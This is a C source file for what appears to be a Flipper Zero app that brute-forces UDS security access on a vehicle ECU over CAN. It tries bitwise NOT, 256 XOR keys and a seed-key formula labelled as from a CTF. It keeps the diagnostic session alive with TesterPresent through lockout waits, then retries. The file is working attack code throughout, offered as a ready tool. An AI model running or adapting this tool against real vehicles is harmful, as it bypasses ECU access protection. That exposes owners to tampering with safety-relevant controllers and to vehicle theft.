#include "../../app_user.h"

// Security access key algorithms
// Order matters: algorithms are tried in this order
#define ALGO_BITWISE_NOT        0   // First: simple NOT
#define ALGO_XOR_RANGE_START    1   // XOR 0x00-0xFF (256 algorithms)
#define ALGO_XOR_RANGE_COUNT    256
#define ALGO_LEVEL3_COMPLEX     257 // Level 3 complex
#define ALGO_COUNT              258

static const char* get_algo_name(uint16_t algo) {
    static char name_buf[32];
    if(algo == ALGO_BITWISE_NOT) {
        return "Bitwise NOT";
    } else if(algo >= ALGO_XOR_RANGE_START && algo < ALGO_XOR_RANGE_START + ALGO_XOR_RANGE_COUNT) {
        snprintf(name_buf, sizeof(name_buf), "XOR 0x%02X", algo - ALGO_XOR_RANGE_START);
        return name_buf;
    } else if(algo == ALGO_LEVEL3_COMPLEX) {
        return "Level3 Complex";
    }
    return "Unknown";
}

// Algorithm 1: Bitwise NOT (simplest, try first)
static void algo_bitwise_not(const uint8_t* seed, uint8_t len, uint8_t* key) {
    for(uint8_t i = 0; i < len; i++) key[i] = ~seed[i];
}

// Algorithm 2: XOR with a byte value
static void algo_xor_byte(const uint8_t* seed, uint8_t len, uint8_t xor_val, uint8_t* key) {
    for(uint8_t i = 0; i < len; i++) key[i] = seed[i] ^ xor_val;
}

// Algorithm 3: Level 3 complex algorithm (VSEC CTF)
static void algo_level3_complex(const uint8_t* seed, uint8_t len, uint8_t* key) {
    if(len < 4) {
        memcpy(key, seed, len);
        return;
    }
    key[0] = ((((seed[0] ^ seed[3]) + seed[0]) ^ 0xFE) - (16 * seed[3])) & 0xFF;
    key[1] = ((((seed[1] ^ seed[2]) + seed[1]) ^ 0xED) - (16 * seed[2])) & 0xFF;
    key[2] = ((((seed[3] ^ seed[1]) + seed[2]) ^ 0xFA) - (16 * seed[1])) & 0xFF;
    key[3] = ((((seed[2] ^ seed[0]) + seed[3]) ^ 0xCE) - (16 * seed[0])) & 0xFF;
}

// Calculate key for a specific algorithm
static void calculate_key(const uint8_t* seed, uint8_t len, uint16_t algo, uint8_t* key) {
    if(algo == ALGO_BITWISE_NOT) {
        algo_bitwise_not(seed, len, key);
    } else if(algo >= ALGO_XOR_RANGE_START && algo < ALGO_XOR_RANGE_START + ALGO_XOR_RANGE_COUNT) {
        uint8_t xor_val = algo - ALGO_XOR_RANGE_START;
        algo_xor_byte(seed, len, xor_val, key);
    } else if(algo == ALGO_LEVEL3_COMPLEX) {
        algo_level3_complex(seed, len, key);
    }
}

// Check if algorithm is valid for given seed length
static bool is_algo_valid(uint8_t seed_len, uint16_t algo) {
    if(algo == ALGO_BITWISE_NOT) {
        return true;
    } else if(algo >= ALGO_XOR_RANGE_START && algo < ALGO_XOR_RANGE_START + ALGO_XOR_RANGE_COUNT) {
        return true;
    } else if(algo == ALGO_LEVEL3_COMPLEX) {
        return seed_len == 4;
    }
    return false;
}

/* ---- Configurable Settings ---- */

static const uint8_t bf_levels[] = {0x01, 0x03, 0x05, 0x11, 0x21};
static const char* bf_level_names[] = {"0x01", "0x03", "0x05", "0x11", "0x21"};
#define BF_LEVEL_COUNT 5

static uint8_t bf_level_index = 0;        // Index into bf_levels[]
static uint8_t bf_attempt_delay_idx = 3;  // Index: delay = (idx+1)*50ms, default idx=3 -> 200ms
static uint8_t bf_lockout_wait_idx = 10;  // Index: wait = (idx+1)s, default idx=10 -> 11s
static uint8_t bf_max_retries = 3;        // 0-10, default 3

// Derived values
#define BF_DELAY_STEP_MS    50
#define BF_DELAY_MAX_IDX    39  // 40 steps: 50ms to 2000ms
#define BF_LOCKOUT_MAX_IDX  29  // 30 steps: 1s to 30s
#define BF_RETRY_MAX        10

static uint32_t bf_menu_selector = 0;

static int32_t uds_bruteforce_thread(void* context);

/* ---- Helpers for display ---- */

static void bf_append_hex(FuriString* text, const uint8_t* data, uint8_t len) {
    for(uint8_t i = 0; i < len; i++) {
        furi_string_cat_printf(text, "%02X", data[i]);
    }
}

/* ---- Bruteforce Settings Menu (VariableItemList) ---- */

typedef enum {
    BfMenuLevel = 0,
    BfMenuDelay,
    BfMenuLockoutWait,
    BfMenuMaxRetries,
    BfMenuStart,
} BfMenuItem;

static void bf_setting_changed(VariableItem* item) {
    App* app = variable_item_get_context(item);
    uint8_t index = variable_item_get_current_value_index(item);
    uint8_t selected = variable_item_list_get_selected_item_index(app->varList);
    FuriString* val_text = furi_string_alloc();

    switch(selected) {
    case BfMenuLevel:
        bf_level_index = index;
        variable_item_set_current_value_text(item, bf_level_names[index]);
        break;

    case BfMenuDelay:
        bf_attempt_delay_idx = index;
        furi_string_printf(val_text, "%lu ms", (uint32_t)(index + 1) * BF_DELAY_STEP_MS);
        variable_item_set_current_value_text(item, furi_string_get_cstr(val_text));
        break;

    case BfMenuLockoutWait:
        bf_lockout_wait_idx = index;
        furi_string_printf(val_text, "%u s", index + 1);
        variable_item_set_current_value_text(item, furi_string_get_cstr(val_text));
        break;

    case BfMenuMaxRetries:
        bf_max_retries = index;
        furi_string_printf(val_text, "%u", index);
        variable_item_set_current_value_text(item, furi_string_get_cstr(val_text));
        break;

    default:
        break;
    }

    furi_string_free(val_text);
}

static void bf_start_callback(void* context, uint32_t index) {
    App* app = context;
    bf_menu_selector = index;

    if(index == BfMenuStart) {
        scene_manager_next_scene(app->scene_manager, app_scene_uds_bruteforce_result_option);
    }
}

void app_scene_uds_bruteforce_menu_on_enter(void* context) {
    App* app = context;
    VariableItem* item;
    FuriString* val_text = furi_string_alloc();

    variable_item_list_reset(app->varList);

    // Security Level
    item = variable_item_list_add(
        app->varList, "Level", BF_LEVEL_COUNT, bf_setting_changed, app);
    variable_item_set_current_value_index(item, bf_level_index);
    variable_item_set_current_value_text(item, bf_level_names[bf_level_index]);

    // Attempt Delay (50ms - 2000ms, step 50ms)
    item = variable_item_list_add(
        app->varList, "Attempt Delay", BF_DELAY_MAX_IDX + 1, bf_setting_changed, app);
    variable_item_set_current_value_index(item, bf_attempt_delay_idx);
    furi_string_printf(val_text, "%lu ms", (uint32_t)(bf_attempt_delay_idx + 1) * BF_DELAY_STEP_MS);
    variable_item_set_current_value_text(item, furi_string_get_cstr(val_text));

    // Lockout Wait (1s - 30s)
    item = variable_item_list_add(
        app->varList, "Lockout Wait", BF_LOCKOUT_MAX_IDX + 1, bf_setting_changed, app);
    variable_item_set_current_value_index(item, bf_lockout_wait_idx);
    furi_string_printf(val_text, "%u s", bf_lockout_wait_idx + 1);
    variable_item_set_current_value_text(item, furi_string_get_cstr(val_text));

    // Max Retries (0 - 10)
    item = variable_item_list_add(
        app->varList, "Max Retries", BF_RETRY_MAX + 1, bf_setting_changed, app);
    variable_item_set_current_value_index(item, bf_max_retries);
    furi_string_printf(val_text, "%u", bf_max_retries);
    variable_item_set_current_value_text(item, furi_string_get_cstr(val_text));

    // Start button
    variable_item_list_add(app->varList, ">> Start Bruteforce", 0, NULL, app);

    variable_item_list_set_enter_callback(app->varList, bf_start_callback, app);
    variable_item_list_set_selected_item(app->varList, bf_menu_selector);

    furi_string_free(val_text);

    view_dispatcher_switch_to_view(app->view_dispatcher, VarListView);
}

bool app_scene_uds_bruteforce_menu_on_event(void* context, SceneManagerEvent event) {
    UNUSED(context);
    UNUSED(event);
    return false;
}

void app_scene_uds_bruteforce_menu_on_exit(void* context) {
    App* app = context;
    variable_item_list_reset(app->varList);
    uds_stop_keepalive();
}

/* ---- Bruteforce Result Scene ---- */

void app_scene_uds_bruteforce_result_on_enter(void* context) {
    App* app = context;
    text_box_reset(app->textBox);
    text_box_set_focus(app->textBox, TextBoxFocusEnd);

    app->thread = furi_thread_alloc_ex("BF27", 4 * 1024, uds_bruteforce_thread, app);
    furi_thread_start(app->thread);

    view_dispatcher_switch_to_view(app->view_dispatcher, TextBoxView);
}

bool app_scene_uds_bruteforce_result_on_event(void* context, SceneManagerEvent event) {
    UNUSED(context);
    UNUSED(event);
    return false;
}

void app_scene_uds_bruteforce_result_on_exit(void* context) {
    App* app = context;
    furi_thread_join(app->thread);
    furi_thread_free(app->thread);
    text_box_reset(app->textBox);
}

/* ---- Bruteforce Worker Thread ---- */

// Send TesterPresent during long waits to keep session alive
static void bf_keepalive_wait(UDS_SERVICE* uds, uint32_t wait_ms) {
    const uint32_t keepalive_interval = 2000; // Send TesterPresent every 2s
    uint32_t elapsed = 0;

    while(elapsed < wait_ms) {
        uint32_t chunk = wait_ms - elapsed;
        if(chunk > keepalive_interval) chunk = keepalive_interval;

        furi_delay_ms(chunk);
        elapsed += chunk;

        if(elapsed < wait_ms) {
            uds_tester_present(uds);
        }
    }
}

static int32_t uds_bruteforce_thread(void* context) {
    App* app = context;
    MCP2515* mcp = app->mcp_can;
    FuriString* text = app->text;

    furi_string_reset(text);

    // Read settings
    uint8_t bf_level = bf_levels[bf_level_index];
    uint32_t attempt_delay = (uint32_t)(bf_attempt_delay_idx + 1) * BF_DELAY_STEP_MS;
    uint32_t lockout_wait = (uint32_t)(bf_lockout_wait_idx + 1) * 1000;
    uint8_t max_retries = bf_max_retries;

    UDS_SERVICE* uds = uds_service_alloc(
        app->uds_send_id, app->uds_received_id, MCP_NORMAL, mcp->clck, mcp->bitRate);

    if(!uds_init(uds)) {
        furi_string_cat_printf(text, "Device not connected\n");
        text_box_set_text(app->textBox, furi_string_get_cstr(text));
        free_uds(uds);
        return 0;
    }

    furi_delay_ms(500);

    uint8_t key_level = bf_level + 1;

    furi_string_cat_printf(text, "Bruteforce Lv.0x%02X\n", bf_level);
    furi_string_cat_printf(
        text,
        "TX:0x%lX RX:0x%lX\n",
        app->uds_send_id,
        app->uds_received_id);
    furi_string_cat_printf(
        text, "Delay:%lums Lock:%lus Retry:%u\n",
        attempt_delay, lockout_wait / 1000, max_retries);
    furi_string_cat_printf(text, "%u algorithms to try\n\n", (unsigned)ALGO_COUNT);
    text_box_set_text(app->textBox, furi_string_get_cstr(text));

    uint8_t lockout_retries = 0;
    bool success = false;

    for(uint16_t algo_idx = 0; algo_idx < ALGO_COUNT; algo_idx++) {
        bool retry;

        do {
            retry = false;

            if(!furi_hal_gpio_read(&gpio_button_back)) goto done;

            /* Configurable delay between attempts */
            furi_delay_ms(attempt_delay);

            /* Step 1: Enter extended session */
            uds_set_diagnostic_session(uds, EXTENDED_UDS_SESSION);
            furi_delay_ms(50);

            /* Step 2: Request seed */
            CANFRAME seed_resp = {0};
            if(!uds_security_request_seed(uds, bf_level, &seed_resp)) {
                furi_string_cat_printf(
                    text, "[%u/%u] %s\n  No seed response\n",
                    algo_idx + 1, (unsigned)ALGO_COUNT,
                    get_algo_name(algo_idx));
                text_box_set_text(app->textBox, furi_string_get_cstr(text));
                continue;
            }

            /* Handle seed request failure */
            if(seed_resp.buffer[1] == 0x7F) {
                uint8_t nrc = seed_resp.buffer[3];
                if(nrc == UDS_NRC_EXCEEDED_ATTEMPTS || nrc == UDS_NRC_TIME_DELAY_NOT_EXPIRED) {
                    lockout_retries++;
                    if(max_retries > 0 && lockout_retries > max_retries) {
                        furi_string_cat_printf(text, "\nECU locked. Abort.\n");
                        text_box_set_text(app->textBox, furi_string_get_cstr(text));
                        goto done;
                    }
                    furi_string_cat_printf(
                        text, "Lockout! Wait %lus...\n", lockout_wait / 1000);
                    text_box_set_text(app->textBox, furi_string_get_cstr(text));
                    // Wait with periodic TesterPresent to keep session alive
                    bf_keepalive_wait(uds, lockout_wait);
                    retry = true;
                    continue;
                }
                furi_string_cat_printf(
                    text, "Seed NRC: %s\n", uds_get_nrc_name(nrc));
                text_box_set_text(app->textBox, furi_string_get_cstr(text));
                goto done;
            }

            if(seed_resp.buffer[1] != 0x67) continue;

            /* Step 3: Extract seed */
            uint8_t pci_len = seed_resp.buffer[0] & 0x0F;
            uint8_t seed_len = (pci_len > 2) ? (pci_len - 2) : 0;
            if(seed_len > UDS_MAX_SEED_KEY_LEN) seed_len = UDS_MAX_SEED_KEY_LEN;

            uint8_t seed[UDS_MAX_SEED_KEY_LEN] = {0};
            for(uint8_t i = 0; i < seed_len; i++) {
                seed[i] = seed_resp.buffer[3 + i];
            }

            /* Check if seed is all zeros (already unlocked) */
            bool all_zero = true;
            for(uint8_t i = 0; i < seed_len; i++) {
                if(seed[i] != 0) {
                    all_zero = false;
                    break;
                }
            }
            if(all_zero) {
                furi_string_cat_printf(text, "Seed=0, already unlocked!\n");
                text_box_set_text(app->textBox, furi_string_get_cstr(text));
                success = true;
                goto done;
            }

            /* Step 4: Compute key */
            uint8_t key[UDS_MAX_SEED_KEY_LEN] = {0};

            // Skip if algorithm not valid for this seed length
            if(!is_algo_valid(seed_len, algo_idx)) {
                continue;
            }
            calculate_key(seed, seed_len, algo_idx, key);

            /* Display attempt */
            furi_string_cat_printf(
                text, "[%u/%u] %s\n S:",
                algo_idx + 1, (unsigned)ALGO_COUNT,
                get_algo_name(algo_idx));
            bf_append_hex(text, seed, seed_len);
            furi_string_cat_printf(text, " K:");
            bf_append_hex(text, key, seed_len);
            text_box_set_text(app->textBox, furi_string_get_cstr(text));

            /* Step 5: Send key */
            CANFRAME key_resp = {0};
            if(!uds_security_send_key(uds, key_level, key, seed_len, &key_resp)) {
                furi_string_cat_printf(text, "\n  -> No key response\n");
                text_box_set_text(app->textBox, furi_string_get_cstr(text));
                continue;
            }

            /* Step 6: Evaluate response */
            if(key_resp.buffer[1] == 0x67 && key_resp.buffer[2] == key_level) {
                /* ---- SUCCESS ---- */
                furi_string_cat_printf(text, "\n");
                furi_string_cat_printf(text, "*** UNLOCKED! ***\n");
                furi_string_cat_printf(
                    text, "Algorithm: %s\n", get_algo_name(algo_idx));
                furi_string_cat_printf(text, "Seed: ");
                bf_append_hex(text, seed, seed_len);
                furi_string_cat_printf(text, "\nKey:  ");
                bf_append_hex(text, key, seed_len);
                furi_string_cat_printf(text, "\n");
                text_box_set_text(app->textBox, furi_string_get_cstr(text));
                success = true;
                goto done;
            }

            if(key_resp.buffer[1] == 0x7F) {
                uint8_t nrc = key_resp.buffer[3];
                furi_string_cat_printf(
                    text, "\n  -> %s\n", uds_get_nrc_name(nrc));
                text_box_set_text(app->textBox, furi_string_get_cstr(text));

                if(nrc == UDS_NRC_EXCEEDED_ATTEMPTS ||
                   nrc == UDS_NRC_TIME_DELAY_NOT_EXPIRED) {
                    lockout_retries++;
                    if(max_retries > 0 && lockout_retries > max_retries) {
                        furi_string_cat_printf(text, "\nECU locked. Abort.\n");
                        text_box_set_text(app->textBox, furi_string_get_cstr(text));
                        goto done;
                    }
                    furi_string_cat_printf(
                        text, "Lockout! Wait %lus...\n", lockout_wait / 1000);
                    text_box_set_text(app->textBox, furi_string_get_cstr(text));
                    bf_keepalive_wait(uds, lockout_wait);
                    retry = true;
                    continue;
                }

                if(nrc == UDS_NRC_INVALID_KEY) {
                    lockout_retries = 0;
                }
            }

        } while(retry && furi_hal_gpio_read(&gpio_button_back));
    }

done:
    if(!success) {
        furi_string_cat_printf(text, "\nNo key found.\n");
    }
    furi_string_cat_printf(text, "Done.");
    text_box_set_text(app->textBox, furi_string_get_cstr(text));

    free_uds(uds);
    return 0;
}
